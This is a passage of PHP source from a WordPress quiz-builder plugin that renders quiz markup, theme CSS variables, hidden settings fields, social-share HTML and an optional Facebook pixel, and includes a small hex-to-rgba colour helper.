		.question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item:not(.ans_type_numeric_text):hover, .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_item::not(.ans_type_numeric_text)hover *, .question_add_answer_outer_div:not(.question_type_slider_has) .addselected *, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_selected:not(.file_upload_cls):not(.numeric_text_cls) .sqb_ans_item, .question_add_answer_outer_div:not(.question_type_slider_has) .sqb_ans_selected:not(.file_upload_cls):not(.numeric_text_cls) .sqb_ans_item *, .answer_container.grid-layout-active:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer:hover, #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:not(.ans_type_numeric_text):hover input, #sqb_quiz_builder .question_container.single_fillin_text .sqb_ans_item:hover textarea, .question_add_answer_outer_div:not(.question_type_slider_has):not(.image_option_has) .sqb_ans_item_outer.multiple_cls.sqb_ans_selected, .answer_container.grid-layout-active:not(.image_option_has) .sqb_ans_item_outer.single_cls.sqb_ans_selected, .answer_container:not(.image_option_has):not(.question_type_slider_has):not(.grid-layout-active) .sqb_ans_item_outer:hover .sqb_ans_item, .multiple_correct_checkbox.checkbox_sel .sqb_ans_item .sqb_ans_item_inner , .multiple_correct_checkbox.checkbox_sel .sqb_ans_item .sqb_ans_item_inner *{
				background-color: '.$answer_background_0.' !important;
				color: '.$answer_background_1.' !important;
				}
				.quiz-slide-animation .Quiz-Template-overflow .answer_container:not(.image_option_has) .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected:not(.text_cls):not(.date_cls):not(.file_upload_cls):not(.slider_cls):not(.numeric_text_cls), .quiz-slide-animation .Quiz-Template-overflow .answer_container:not(.image_option_has) .multiple_correct_checkbox.sqb_ans_item_outer.multiple_cls.sqb_withoutradio.sqb_ans_selected:not(.text_cls):not(.date_cls):not(.file_upload_cls):not(.slider_cls):not(.numeric_text_cls) .sqb_ans_item * , #sqb_quiz_builder .Quiz-Template-overflow .answer_container:not(.question_type_slider_has) .sqb_ans_selected:not(.text_cls):not(.date_cls):not(.file_upload_cls):not(.slider_cls):not(.numeric_text_cls) .sqb_ans_item *{
		    background-color: '.$answer_background_0.' !important;  color: '.$answer_background_1.' !important;
		}#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices,
		#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices .sqb_ans_item_inner,
		#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices *,
		#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices .sql_ans_text,
		#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.ranking_choices .sqb_ans_item.ans_type_ranking_choices .sql_ans_text * {background: #e5f1ff !important;color: #333 !important;}
		body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .answer_container textarea, body .sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .single_fillin_text .sqb_fill_in_blank_ans_field {
		    color: #333 !important; background: #fff !important;
		}
		 .quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner, .quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner * {
		    color: #333 !important;
		}

		 #sqb_quiz_builder .Quiz-Template-overflow .answer_container:not(.question_type_slider_has) .sqb_ans_selected .sqb_ans_item * {
		    background-color: inherit !important;    
		}
		.quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner, .quiz-slide-animation #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_selected .sqb_ans_item_inner * {
		    background-color: inherit !important;
		}
		.quiz-slide-animation .Quiz-Template-overflow .answer_container .multiple_correct_checkbox.multiple_cls.sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):after , .quiz-slide-animation .Quiz-Template-overflow .answer_container .single_cls.sqb_ans_item_outer.sqb_ans_selected:not(.matrix_cls):after {
		   display:none;
		}
		.sqb_quiz_container_outer #sqb_quiz_builder .quiz_quesans_template_outer .Quiz-Template-overflow .answer_container .sqb_ans_selected .ans_type_rating.sqb_ans_item * {
		    background: #fff !important;
		}
		#sqb_quiz_builder .Quiz-Template .answer_container .sqb_ans_item_outer.sqb_ans_selected .sqb_ans_item.ans_type_rating, #sqb_quiz_builder .Quiz-Template.Quiz-Template-5 .answer_container .sqb_ans_item_outer.sqb_ans_selected .sqb_ans_item.ans_type_rating {
		    padding-left: 0;
		}
		 </style> 
				';
				if(!empty($customizer_style_settings["outcome_tag_width"])){
				$outcome_tag_width = $customizer_style_settings["outcome_tag_width"];
			}

			$tag_width_data = ' <style>
			:root{--sqb-tag-container-width: '.@$outcome_tag_width.';}</style>';
		}else{
			if(!empty($customizer_style_settings["outcome_tag_width"])){
				$outcome_tag_width = $customizer_style_settings["outcome_tag_width"];
			}

			$tag_width_data = ' <style>
			:root{--sqb-tag-container-width: '.@$outcome_tag_width.';}</style>';
		}



		$screen_name = 'settings_background_color';
		$strm_type = 'settings';

		$setting_tag_background_color = "rgba(255,255,255,1)";
		$charts_bar_background_color = "rgba(255,255,255,1)";
		$setting_ans_ad_recommendation = "rgba(255,255,255,1)";
		$setting_category_background_color  = "rgba(255,255,255,1)";
		$setting_question_ads_color = "rgba(255,255,255,1)";
		$setting_personalization_color = "rgba(255,255,255,1)";
		$setting_analyzing_screen_color = "rgba(255,255,255,1)";
		$setting_personalization_width_input = "640";
		$setting_analyzing_width_input = "700";
		$setting_tag_width_input = "700";
		$setting_question_width_input = "750";
		$setting_category_width_input = "700";

		$theme_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($id,$screen_name,$strm_type);
		if($theme_data_has){
			$colorpickerdata = maybe_unserialize($theme_data_has->getValue());

			if(!empty($colorpickerdata["setting_tag_background_color"])){
				$setting_tag_background_color = $colorpickerdata["setting_tag_background_color"];
			}

			if(!empty($colorpickerdata["setting_category_background_color"])){
				$setting_category_background_color = $colorpickerdata["setting_category_background_color"];
			}

			if(!empty($colorpickerdata["setting_ans_ad_recommendation"])){
				$setting_ans_ad_recommendation = $colorpickerdata["setting_ans_ad_recommendation"];
			}

			if(!empty($colorpickerdata["setting_question_ads_color"])){
				$setting_question_ads_color = $colorpickerdata["setting_question_ads_color"];
			}

			if(!empty($colorpickerdata["setting_personalization_color"])){
				$setting_personalization_color = $colorpickerdata["setting_personalization_color"];
			}

			if(!empty($colorpickerdata["setting_analyzing_screen_color"])){
				$setting_analyzing_screen_color = $colorpickerdata["setting_analyzing_screen_color"];
			}
			if(!empty($colorpickerdata["setting_personalization_width_input"])){
				$setting_personalization_width_input = $colorpickerdata["setting_personalization_width_input"];
			}
			if(!empty($colorpickerdata["setting_analyzing_width_input"])){
				$setting_analyzing_width_input = $colorpickerdata["setting_analyzing_width_input"];
			}
			if(!empty($colorpickerdata["setting_question_width_input"])){
				$setting_question_width_input = $colorpickerdata["setting_question_width_input"];
			}
			if(!empty($colorpickerdata["setting_tag_width_input"])){
				$setting_tag_width_input = $colorpickerdata["setting_tag_width_input"];
			}
			if(!empty($colorpickerdata["setting_category_width_input"])){
				$setting_category_width_input = $colorpickerdata["setting_category_width_input"];
			}
			if(!empty($colorpickerdata["charts_bar_background_color"])){
				$charts_bar_background_color = $colorpickerdata["charts_bar_background_color"];
			}
		}


		$background_color = '<style>	 
				:root{
					--setting_tag_background_color: '.$setting_tag_background_color.';
					--setting_ans_ad_recommendation: '.$setting_ans_ad_recommendation.';
					--setting_category_background_color: '.$setting_category_background_color.';
					--setting_question_ads_color: '.$setting_question_ads_color.';
					--setting_personalization_color: '.$setting_personalization_color.';
					--setting_analyzing_screen_color: '.$setting_analyzing_screen_color.';
					--setting_personalization_width_input: '.$setting_personalization_width_input.'px;
					--setting_analyzing_width_input: '.$setting_analyzing_width_input.'px;
					--setting_question_width_input: '.$setting_question_width_input.'px;
					--setting_tag_width_input: '.$setting_tag_width_input.'px;
					--setting_category_width_input: '.$setting_category_width_input.'px;
					--charts_bar_background_color: '.$charts_bar_background_color.';
				}
				</style>';

		$matrix_screen_name = 'matrix_background_color';
		$matrix_strm_type = 'matrix';

		$matrix_background_color = '#f5f5f5';
		$radio_button_border_color = '';
		$radio_button_color = '#55c57a';

		$theme_matrix_data_has = SQB_GlobalTheme::loadByQuizIdAndNameAndType($id,$matrix_screen_name,$matrix_strm_type);
		if($theme_matrix_data_has){
			$theme_matrix_data = maybe_unserialize($theme_matrix_data_has->getValue());

			if(!empty($theme_matrix_data["matrix_background_color"])){
				$matrix_background_color = $theme_matrix_data["matrix_background_color"];
			}

			if(!empty($theme_matrix_data["radio_button_border_color"])){
				$radio_button_border_color = $theme_matrix_data["radio_button_border_color"];
			}

			if(!empty($theme_matrix_data["radio_button_color"])){
				$radio_button_color = $theme_matrix_data["radio_button_color"];
			}
		}

		$background_color.= '<style>
			:root{
				--matrix_background_color: '.$matrix_background_color.';
				--radio_button_border_color: '.$radio_button_border_color.';
				--radio_button_color: '.$radio_button_color.';
			}</style>';

		if($template_num == 'template6' || $template_num == 'template8'|| $quiz_type == 'poll'){

		}else{
			$settings_data = getStyleForAnswer($sqbObj);			
		}
		//Get social share details 
		$share_paremets = base64_encode('quiz_id='.$sqbObj->getId());
		$removeChar = array("https://", "http://");
		$site_url_remove_char = str_replace($removeChar, "", site_url());		 
		$removeCharArray =explode("/", $site_url_remove_char);
		$get_site_url = $removeCharArray[0];
		 
		$sqb_share_url_generate = plugins_url().'/smartquizbuilder/social_share.php?sqb=';
		$sqb_share_url_generate_tw = plugins_url().'/smartquizbuilder/tw.php?sqbtw='; 



		$ip = $_SERVER['REMOTE_ADDR'];
		//$gdprcountry = sqbGetGDPRStatus($ip);
		//$is_googlefont = get_option('sqb_google_font_option', true);

		if($gdprcountry == 1){
			$output .= '<input type="hidden" id="gdpr_compliance" value="'.$gdprcountry.'">'; 
		}else{
			$output .= '<input type="hidden" id="gdpr_compliance" value="0">'; 
		}

		if($is_googlefont != 'N'){
			$output .= '<input type="hidden" id="is_googlefont" value="1">'; 
		}else{
			$output .= '<input type="hidden" id="is_googlefont" value="0">'; 
		}

		$output .= '<input type="hidden" id="quiz_recommendation_option" value="'.$quiz_recommendation_option.'">';
		$output .= '<input type="hidden" id="quiz_attempted" value="N">'; 
		$output .= '<input type="hidden" id="sqb_share_url_generate" value="'.$sqb_share_url_generate.'">'; 
		$output .= '<input type="hidden" id="sqb_share_url_generate_tw" value="'.$sqb_share_url_generate_tw.'">'; 
		$output .= '<input type="hidden" id="sqb_quiz_title" value="'.htmlentities($quiz_title).'">'; 
		$output .= '<input type="hidden" id="show_optin" value="'.$show_optin.'">';  
		$output .= '<input type="hidden" id="sqb_opt_screen_position" value="'.$sqb_opt_screen_position.'">';  
		$output .= '<input type="hidden" id="show_analyzing_result" value="'.$show_analyzing_result.'">';  
		$output .= '<input type="hidden" id="show_analyzing_time_delay" value="'.$show_analyzing_result_time.'">';  
		 
		$output .= '<input type="hidden" id="show_result_screen" value="'.$show_result_screen.'">';  
		$output .= '<input type="hidden" id="auto_submit_optin" value="'.$auto_submit_optin.'">';  
		$output .= '<input type="hidden" id="tw_share_description" value="">'; 
		$output .= '<input type="hidden" id="get_site_url" value="'.$get_site_url.'">'; 
		$output .= '<input type="hidden" id="get_home_url" value="'.get_home_url().'">'; 
		$output .= '<input type="hidden" id="show_next_button" value="'.$show_next_button.'">';
		$output .= '<input type="hidden" id="show_back_button" value="'.@$show_back_button[0].'">';
		$output .= '<input type="hidden" id="show_back_button_change" value="'.@$show_back_button[1].'">';
		$output .= '<input type="hidden" id="quick_email_verification" value="'.$quick_email_verification.'"/>';  
		$output .= '<input type="hidden" id="allow_retake_new" value="'.$allow_retake_new.'"/>';  
		$output .= '<input type="hidden" id="total_attempts_new" value="'.$total_attempts_new.'"/>';  
		$output .= '<input type="hidden" id="quiz_attempts_allowed_new" value="'.$quiz_attempts_allowed_new.'"/>';  
		$output .= '<input type="hidden" id="email_verify_result" name="email_verify_result" value="">';		
		$output .= '<input type="hidden" id="move_question" name="move_question" value="'.$move_question.'">';		
		$output .= '<input type="hidden" id="quiz_slider_animation_option" name="quiz_slider_animation_option" value="'.$quiz_slider_animation_option.'">';		
		$output .= '<input type="hidden" id="exitpopup" name="exitpopup" value="0">';	
		$output .= '<input type="hidden" id="outcome_screen_charts_settings" value="'.rawurlencode(stripslashes($getOutcomeScreenChartsSettings)).'">'; 	
		$output .= '<input type="hidden" id="sqb_ans_tags" value="'.$sqb_ans_tags.'">'; 	
		$output .= '<input type="hidden" id="social_share_screen_value" value="'.$getSocialShareScreenValue.'">'; 	
			 
		$name = 'facebook';
		$key = 'fb_api_key';
		$fb_api_key = '';
		$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
		$social_share_fb_api_key = '';
		if($obj){ 
			$output .= '<script src="//connect.facebook.net/en_US/all.js"></script>';		
			$social_share_fb_api_key =  $obj->getValue();
			$output .= '<script async defer crossorigin="anonymous" src="//connect.facebook.net/en_US/sdk.js"></script>'; 
		}
			 
		$not_passed_quiz_msg = sqbGetValidSettingsByKey('not_passed_quiz_msg');
		if($not_passed_quiz_msg == ""){
			$not_passed_quiz_msg = 'You have not passed the quiz.';
		}
				
		$sqboutcomeobj =  SQB_Outcome::loadByQuizId($id); 
		$fb_share_thank_you_msg = '';
		$output .= '<input type="hidden" id="social_share_fb_api_key" value="'.$social_share_fb_api_key.'">'; 
		$output .= '<input type="hidden" name="fb_share_thank_you_msg" id="fb_share_thank_you_msg" value="'.$fb_share_thank_you_msg.'">'; 
		$output .= '<input type="hidden" name="quiz_outcome_has" id="quiz_outcome_has" value="'.count($sqboutcomeobj).'">'; 
		$output .= '<input type="hidden" name="share_paremets_quiz" id="share_paremets_quiz" value="'.$share_paremets.'">'; 
		$output .= '<input type="hidden" name="not_passed_quiz_msg" id="not_passed_quiz_msg" value="'.$not_passed_quiz_msg.'">'; 
		
		$dap_login_email_id = '';
		$dap_login_first_name = '';
		$getCredits_available = 0;
		$lldocroot = defined('SITEROOT') ? SITEROOT : $_SERVER['DOCUMENT_ROOT'];
		if(file_exists($lldocroot . "/dap/dap-config.php")){ 
			 include_once ($lldocroot . "/dap/dap-config.php");   
			 $dap_session = Dap_Session::getSession();
			 $dap_user = $dap_session->getUser(); 

			 if( Dap_Session::isLoggedIn() && isset($dap_user) ) {
				
				 $dap_login_email_id = $dap_user->getEmail();
				 $dap_login_first_name = $dap_user->getFirst_name();
				// $getCredits_available =  $dap_user->getCredits_available();
				 /*if($show_firstname_template == 'Y'){
					 $dap_login_first_name = '';
				 } */

				$userNew = Dap_User::loadUserById($dap_user->getId()); //reload User object
				if(isset($userNew)) {
				  	$getCredits_available = $userNew->getCredits_available();

				}
			 }
		}
	   
		$output .= '<input type="hidden" name="dap_login_first_name" id="dap_login_first_name" value="'.$dap_login_first_name.'">'; 
		$output .= '<input type="hidden" name="dap_login_email_id" id="dap_login_email_id" value="'.$dap_login_email_id.'">'; 
		
		$sqb_show_share_screen = $sqbObj->getShowShareScreen();

		//if($sqb_show_share_screen == 'Y'){
			//Get social share details 
			$social_share_hmtl = "<div class='sqb_social_share_html' style='display:none'>";
		    $social_share_Obj = SQB_Social_Share::loadActiveAndQuizId($sqbObj->getId());
		    $social_share_url = '';
		    if(isset($social_share_Obj)){
				$social_share_hmtl .= $social_share_Obj->getHtml();
				$social_share_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") .'://'.$social_share_Obj->getShareLink();
			}
			$social_share_hmtl .= '</div>';	    
			$output .= $social_share_hmtl;	
		//}
		
		$output_final = stripslashes($output);
		$output_final  = str_replace('contenteditable="true"','contenteditable="false"',$output_final); 
		$dap_id = '';
		//replace merge tag %%FIRST%%				 
		if($status =="Y"){
			do_action( 'dap_sqb_session');
			if(isset($_SESSION['current_lesson_id'])){
				$lesson_id = $_SESSION['current_lesson_id'];
			}
			if(isset($_SESSION['course_id'])){
				$course_id = $_SESSION['course_id'];
			}		
			if(isset($_SESSION['first_name'])){
				$first_name = $_SESSION['first_name'];
			}			 
			if(isset($_SESSION['dap_id'])){
				$dap_id = $_SESSION['dap_id'];
			}
		}
		if($dap_id !=""){		
			if($lesson_id !=''  && $course_id != '') {					
				$output_final  = str_replace('%%FIRST%%', $first_name,$output_final); 
				$quiz_slider_animation ="N";				
			}
		}
		$hiddenFields = '<input type="hidden" id="quiz_blocking" value="'.$quiz_blocking.'"><input type="hidden" id="quiz_passmark" value="'.$quiz_passmark.'"><input type="hidden" id="pass_criteria" value="'.$quiz_passcriteria.'"><input type="hidden" name="sqb_social_share_url" value="'.$social_share_url.'">';
		$name = 'facebook';
		$key = 'fb_tracking_id';
		$fb_tracking_details = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
		$fb_tracking_id = '';
		$script_code = ''; 
		if($fb_tracking_details != false){ 
			$fb_tracking_id = $fb_tracking_details->getValue();	
			$script_code = "
		<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
						n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
						n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
						t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
						document,'script','//connect.facebook.net/en_US/fbevents.js');					 
						fbq('init', '".$fb_tracking_id."');	
			</script>";
		}
		
		// Outcome rank description
		
		$quiz_outcome_descrition = SQB_QuizOutcomeDescription::loadByQuizId($id);
		
		$rank_json = array();
		foreach($quiz_outcome_descrition as $v){
			$outcome_id = $v->getOutcomeId();
			$rank_json[$outcome_id] = $v;
		}

		if(!empty($rank_json)){
			$rank_shortcode = json_encode($rank_json);
		}else{
			$rank_shortcode = '[]';
		}

		$rank_shortcode = '<script>var rank_outcome = '.($rank_shortcode).';</script>';
							  
		if($progress_bar_display =="N"){
			 $hideprogreebarcss=  '<style>.progress {display: none}</style> ';			
		}else{
			$hideprogreebarcss=  '<style>.progress {display: block}</style> ';
		}
		$outputdata = $hiddenFields.$output_final.$script_code.$settings_data.$hideprogreebarcss.$tag_width_data.$background_color.$rank_shortcode;
	}	
	// destroy session
	unset($_SESSION['course_id']);
	unset($_SESSION['current_lesson_id']);
	unset($_SESSION['dap_id']);
	unset($_SESSION['user_has_taken_quiz']);
	unset($_SESSION['first_name']);
	$_SESSION['course_id'] = "";	 		
	$_SESSION['current_lesson_id'] = "";
	$_SESSION['dap_id'] = "";	 
	$_SESSION['user_has_taken_quiz'] = "";	  
	$_SESSION['first_name'] = "";

	$css_style = '<style>.outer-style1 {  border-image-source: url('.site_url().'/wp-content/plugins/smartquizbuilder/includes/images/template-4-bg.png)!important;   }</style>';

	$add_animation_class ="";
	if($quiz_slider_animation != 'N'){	
		if($quiz_slider_animation_option == 'rl'){
			$add_animation_class= " quiz-slide-animation ";
		}else if($quiz_slider_animation_option == 'tb'){
			$add_animation_class= " quiz-slide-animation top-to-bottom";
		}
	}
	$display_message='';
	$points='';
	$total_ponints_bg_color='#ffffff';
	$your_total_points = '<div><span style="font-size: 15pt;"><strong>YOUR TOTAL POINTS</strong></span></div>';
	if(class_exists('SQB_QuizPoints')){	//Get data from SQB	
	$getpointsdata = SQB_QuizPoints::loadByQuizId($id);			 
		if(isset($getpointsdata) && $getpointsdata != null){ 				 
			$display_message = $getpointsdata->getDisplayMessage();
			 $points = $getpointsdata->getPoints();
			 $display_message =  str_replace('contenteditable="true"','',$display_message);
			 $display_message =  str_replace('%%POINTS%%',$points,$display_message);			 
			 $display_message =  str_replace('%%FIRST_NAME%%',$dap_login_first_name,$display_message);			 
		}
	}
	/*$display_message_data = '  <div class="display_message-popup-outer" style="display:none" >
			 <div class="display_message-popup-inner">
			   <a href="javascript:void(0);" class="display_message-popup-close"> x</a>
			   <div class="display_message-popup-body">				  
				 <div class="display_message-popup-content">
				   '.$display_message.'
				 </div>
			   </div>
			 </div>
			</div><style> .sqb_edit_template , .quiz_start_template_outer  .sqb_edit_template {display:none!important;}
</style>';*/

	if (isset($course_id) && $course_id != '') {
		$your_total_points = '<div><span style="font-size: 15pt;"><strong>YOUR TOTAL POINTS</strong></span></div>';
		$total_ponints_bg_color = '#ffffff';
		$is_total_ponints_msg_html_obj =  Dap_Messages::loadByTypeAndTypeValueAndName('product', $course_id, 'yourtotalpointscustom');
	    if(isset($is_total_ponints_msg_html_obj)){
		   $your_total_points = $is_total_ponints_msg_html_obj->getValue();
	    }

	    $total_ponints_bg_color_obj =  Dap_Messages::loadByTypeAndTypeValueAndName('product', $course_id, 'totalpointsbgcolorcustom');
	    if(isset($total_ponints_bg_color_obj)){
		   $total_ponints_bg_color = $total_ponints_bg_color_obj->getValue();
	    }
    }


	$display_message_data ='<div class="dap-ponits-msg-container-xp-active hidden_sqb_quiz_credit_banner" data-sqbpoint="'.$points.'">
				<div class="dap-xp-sticky dap-xp-sticky-active">
					<div class="dap-xp-holder" style="background-color: '.$total_ponints_bg_color.'">
						<button type="button" class="dap-xp-sticky-opener" style="background-color: '.$total_ponints_bg_color.'">
							<i class="fa fa-angle-down"></i>
						</button><div class="dap-xp-content-wrapper">
						<div class="dap-xp-content-row">
							<div class="xp-holder__text hidden md:flex md:items-center">
								<div>
									<h2 class="dap-text-xp-text dap-text-xp-heading">'.$your_total_points.'
									<div class="dap-xp-point-number" <span="">
										<span>'.$getCredits_available.'</span>
									</div></h2>
									<div class="dap-text-xp-text"> '.$display_message.' </div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div><style> .sqb_edit_template , .quiz_start_template_outer  .sqb_edit_template, .hidden_sqb_quiz_credit_banner {display:none!important;}</style>';

	//timer	 
	$timer_data =getTimerData($timer_enable,$quiz_timer_hours,$quiz_timer_mint,$quiz_timer_sec,$quiz_timer_elapses_option,$quiz_timer_display_in_screen,$quiz_timer_html,$quiz_timer_expired_msg, $quiz_timer_spent_html,$timer_text_hour_html,	$timer_text_mint_html,$timer_text_sec_html);
	
	//global theme style
	$global_theme_array = SQBGetGlobalStyle($id);
	$global_style = '';
	$global_class = '';
	if(isset($global_theme_array['style'])){
		$global_style = $global_theme_array['style'];
	}
	
	if(isset($global_theme_array['class'])){
		$global_class = $global_theme_array['class'];
	}
	//mobile style
	$mobile_style = SQBAddMobileStyle($id);
	$mobile_class=' sqb_mobile_view_layout_active ' ;
	$previewcss='';
	if($SQBPreview =="Y"){
		$previewcss= '<style> .quiz_start_template_outer .Quiz-start-Template5-inner{min-height: 90vh !important;}.sqb_quiz_container .question_img_div { height: 300px;}
</style>';
		 
	}
	
	
	$category_customizer_values = sqbGetValidSettingsByKey('category_customizer_values');

	if($category_customizer_values){
		$category_customizer_values = explode('|', $category_customizer_values);
		$width = $category_customizer_values[0];
		$background_color = $category_customizer_values[1];
		$border_width = $category_customizer_values[2];
		$borer_style = $category_customizer_values[3];
		$border_color = $category_customizer_values[4];
		$spread_radius = $category_customizer_values[5];
		$blur_radius = $category_customizer_values[6];
		$horizontal_length = $category_customizer_values[7];
		$vertical_length = $category_customizer_values[8];
		$boxshadow_color = $category_customizer_values[9];
		$customizer_align_style = $category_customizer_values[10];
		$cust_margin = $category_customizer_values[11];
		$cust_padding = $category_customizer_values[12];
	}else{
		$width = '375';
		$background_color = '#f3f3ff';
		$border_width = '3';
		$borer_style = 'dotted';
		$border_color = '#0c0000';
		$spread_radius = '0';
		$blur_radius = '0';
		$horizontal_length = '0';
		$vertical_length = '0';
		$boxshadow_color = '#ffffff';
		$customizer_align_style = 'left';
		$cust_margin = '10';
		$cust_padding = '25';
	}
	$cat_styles = '<style> #sqb_quiz_builder  .sqb_category_details {max-width:'.$width.'px;background-color:'.$background_color.';border-width:'.$border_width.'px;border-style:'.$borer_style.';border-color:'.$border_color.';box-shadow:'.$boxshadow_color.' '.$horizontal_length.'px '.$vertical_length.'px '.$blur_radius.'px '.$spread_radius.'px;float:'.$customizer_align_style.';margin-bottom:'.$cust_margin.'px;padding:'.$cust_padding.'px; }</style>';
	$cat_div_per = '<div class="category_number_percent_co" style="display: none;"></div>'; 
	$loader ='<div class="sqb_loader_outer" style="display: block;"><div class="sqb_loader_inner"></div></div>';
	
	return do_shortcode($loader.$cssAndJsCornerPopup1.$cssAndJsCornerPopup.$cat_styles.'<div class="'.$focus_mode_enabled.' sqb_quiz_container_outer  template_num_'.$template_num.' '.$quiz_display.'_popup_sqb '.$add_animation_class.' '.$global_class.' '.$mobile_class.'" id="sqbquizouter_'.rand(1,1000).'" style="display:none"> '.$timer_data.$outputdata.$cat_div_per.$css_style.$display_message_data.$global_style.$mobile_style.$previewcss.'</div>');
    
}


/* Convert hexdec color string to rgb(a) string */

function sqb_hex2rgba($color, $opacity = false) {

	$default = 'rgb(0,0,0)';

	//Return default if no color provided
	if(empty($color))
          return $default; 

	//Sanitize $color if "#" is provided 
        if ($color[0] == '#' ) {
        	$color = substr( $color, 1 );
        }

        //Check if color has 6 or 3 characters and get values
        if (strlen($color) == 6) {
                $hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );
        } elseif ( strlen( $color ) == 3 ) {
                $hex = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );
        } else {
                return $default;
        }

        //Convert hexadec to rgb
        $rgb =  array_map('hexdec', $hex);

        //Check if opacity is set(rgba or rgb)
        if($opacity){
        	if(abs($opacity) > 1){
        		$opacity = 1.0;
        	}
        	$output = 'rgba('.implode(",",$rgb).','.$opacity.')';
        } else {
        	$output = 'rgb('.implode(",",$rgb).')';
        }

        //Return rgb(a) color string
        return $output;
}

function sqbGetFormQuizData($quiz_id){
	$output = '';
	$sqbObj =  SQB_FormQuiz::loadByQuizId($quiz_id);
	if(isset($sqbObj) && $sqbObj != ''){
		$quiz_displayed = $sqbObj->getDisplayType();
		$page_ids = $sqbObj->getPageIds();
		$output .= '<input type="hidden" id="form_quiz_displayed" value="'.$quiz_displayed.'">';
		$output .= '<input type="hidden" id="form_quiz_page_ids" value="'.$page_ids.'">';
	}

	$exit_popup_val = '';
	$exit_popup_timer = sqbGetValidSettingsByKey('exit_popup_timer');
	if(isset($exit_popup_timer) && $exit_popup_timer != ''){
		$exit_popup_val = $exit_popup_timer;
	}else{
		$exit_popup_val = '5';
	}
	$output .= '<input type="hidden" id="exit_popup_timer" value="'.$exit_popup_val.'">';;

	return $output;
}

function sqbGetsocialShareData($quiz_id, $sqb_show_share_screen, $quiz_display, $quiz_popup_position,$template_num){

	/* End */
	$template6_bg_style = sqbGetTemplate6bgImageStyle($quiz_id, $template_num);
	$default_image = $template6_bg_style[0]; 
	$image_background = $template6_bg_style[1]; 
	$classforvh = $template6_bg_style[2];

	 $output=''; 
	 $template_num = '';
	 $classforvh = '';
	 $output_data = '';
	 $modal_pop_corner_position = '';
	if($sqb_show_share_screen  == 'Y'){
		$sqbShareData =  SQB_Social_Share::loadByQuizId($quiz_id);
		$html = '';
		if(isset($sqbShareData)){
			$html = $sqbShareData->getHtml();
		}
		if($html != ''){
			$inner_html = stripslashes($html);
		}else{
			$inner_html = '<div class="customize_social_share_wrapper"><h3 class="sqbShareResult--heading">Share your Results on Social</h3><div class="quiz-social-links"><a href="javascript:void(0)" target="_blank" class="quiz-social-media-btn quiz-Facebook-btn"><i class="fa fa-facebook" aria-hidden="true"></i></a><a href="javascript:void(0)" target="_blank" class="quiz-social-media-btn quiz-twitter-btn"><i class="fa fa-twitter" aria-hidden="true"></i></a></div></div>
			';
		}
			$output = '<div class="analyzing_result_temp sqb_social_share_temp" style="text-align: center;">
			<div class="analyzing_result_content sqb_social_share_content">';
			$output .= $inner_html;
			$output .= '<div class="sqb_social_share_message sqbErrorMessage"></div>
			<div class="sqb_social_share_next_btn disable_social_share_next_btn" style="display: inline-block; border-radius: 5px; background: rgb(37, 37, 37); color: rgb(255, 255, 255); height: auto; padding: 13px 15px; font-family: &quot;DM Sans&quot;, sans-serif; min-width: 90px; box-shadow: none; text-decoration: none; line-height: normal; border: none; text-align: center; text-transform: initial; font-size: 16px; font-weight: 600; width: 128px; max-width: 100%; cursor: pointer; float: none; position: relative;"><div>Next</div></div>';
			$output .= '</div></div>';
			$output = str_replace('contenteditable="true"','contenteditable="false"',$output);
	
		$displaydata= "display:none;";		
		if($template_num == 'template5'){
		$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template5/template5.css";
		}else if($template_num == 'template8'){
		$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template8/template8.css";
		} else {
		$csspath =  plugin_dir_url(__FILE__)."includes/templates/result/template2/template2.css";
		}
		
		$cssfile = '<link href="'.$csspath.'" rel="stylesheet">'; 

		if($quiz_display =="popup" || $quiz_display =="exit" || $quiz_display =="entry" || $quiz_display =="time_based" || $quiz_display =="percentage_based"){
			$close_data = '<div class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></div>';
